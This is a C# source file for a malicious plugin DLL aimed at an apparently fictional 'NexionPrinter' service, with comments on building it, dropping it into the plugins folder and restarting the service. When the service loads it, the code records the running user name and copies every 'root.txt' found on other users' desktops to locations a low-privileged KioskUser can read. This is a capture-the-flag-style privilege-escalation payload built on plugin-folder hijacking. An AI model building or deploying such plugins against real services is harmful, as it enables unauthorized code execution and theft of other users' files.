using System;
using System.IO;

// NexionPrinter (net8.0) LoadFrom(plugins\*.dll) and invokes a public Initialize().
// Build: dotnet build PrinterPlugin.csproj -c Release
// Drop the DLL into the printer plugins\ folder, then POST /api/printer/restart.

public class PrinterPlugin
{
    public void Initialize()
    {
        string msg = DateTime.Now.ToString("o") + " USER=" + Environment.UserName + "\n";
        string[] logs =
        {
            @"C:\ProgramData\Nexion\plugin.log",
            @"C:\Users\Public\plugin.log",
        };
        foreach (string l in logs)
        {
            try { File.AppendAllText(l, msg); } catch { }
        }

        try
        {
            foreach (string dir in Directory.GetDirectories(@"C:\Users"))
            {
                string src = Path.Combine(dir, "Desktop", "root.txt");
                if (!File.Exists(src))
                    continue;
                if (src.IndexOf("KioskUser", StringComparison.OrdinalIgnoreCase) >= 0)
                    continue;
                try { File.Copy(src, @"C:\Users\KioskUser\Desktop\root.txt", true); } catch { }
                try { File.Copy(src, @"C:\Users\Public\root.txt", true); } catch { }
                try { File.Copy(src, @"C:\ProgramData\Nexion\root.txt", true); } catch { }
            }
        }
        catch { }
    }
}
